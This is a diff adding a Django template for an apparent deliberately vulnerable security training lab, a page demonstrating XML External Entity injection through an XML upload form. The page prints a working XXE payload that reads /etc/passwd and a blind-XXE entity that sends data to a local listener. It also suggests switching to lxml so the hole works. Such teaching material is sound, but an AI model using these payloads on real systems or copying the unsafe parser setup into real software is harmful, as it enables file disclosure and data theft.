@@ -1,0 +1,55 @@
+{% extends "base.html" %}
+{% block title %}XML Import (XXE) – SecurityLab{% endblock %}
+{% block content %}
+<div class="card">
+  <h1>📄 XML Import – XXE Demo</h1>
+
+  <div class="vuln-box">
+    <strong>[V-26] XML External Entity (XXE) Injection</strong><br>
+    Upload an XML file. The parser processes DOCTYPE/ENTITY declarations.<br><br>
+    <strong>Payload to read /etc/passwd (save as customers.xml):</strong>
+    <pre style="margin-top:8px">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE customers [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;customers&gt;
+  &lt;customer&gt;
+    &lt;name&gt;&amp;xxe;&lt;/name&gt;
+    &lt;email&gt;leak@test.com&lt;/email&gt;
+  &lt;/customer&gt;
+&lt;/customers&gt;</pre>
+    <strong>Blind XXE (hit the listener):</strong>
+    <pre style="margin-top:8px">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080/?data=stolen"&gt;</pre>
+    Note: Standard library ET blocks this in Python ≥ 3.8. Swap to <code>lxml</code> for full demo.
+  </div>
+
+  {% if message %}
+    <div class="success">{{ message }}</div>
+  {% endif %}
+
+  <form method="post" enctype="multipart/form-data">
+    {% csrf_token %}
+    <label>XML File</label>
+    <input type="file" name="xmlfile" accept=".xml" style="color:#c9d1d9;margin-top:8px">
+    <button type="submit">Import</button>
+  </form>
+</div>
+
+{% if customers %}
+<div class="card">
+  <h2>Imported Customers</h2>
+  <table>
+    <thead><tr><th>ID</th><th>Name</th><th>Email</th></tr></thead>
+    <tbody>
+      {% for c in customers %}
+      <tr>
+        <td>{{ c.pk }}</td>
+        <td>{{ c.name }}</td>
+        <td>{{ c.email }}</td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+</div>
+{% endif %}
+{% endblock %}
